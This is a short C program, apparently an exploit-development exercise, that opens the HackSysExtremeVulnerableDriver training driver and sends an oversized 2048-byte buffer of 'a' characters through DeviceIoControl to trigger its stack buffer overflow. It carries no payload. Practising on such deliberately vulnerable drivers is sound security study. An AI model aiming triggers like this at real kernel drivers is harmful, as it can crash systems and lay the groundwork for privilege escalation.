//write by Jimp on 2021.7.15
#include <stdio.h>
#include <Windows.h>

int main()
{
	char buffer[2048];
	DWORD length = 0;
	HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, 
		0,
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		0);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("failed to open the file……\n");
		return -1;
	}

	printf("get the handle: 0x%x\n", (int)hDevice);

	memset(buffer, 'a', 2048);
	BOOL ret = DeviceIoControl(hDevice,
		0x222003,
		buffer,
		2048,
		NULL,
		0,
		&length,
		NULL);
	if (!ret)
	{
		printf("failed to send message……\n");
	}
	CloseHandle(hDevice);
	return 0;
}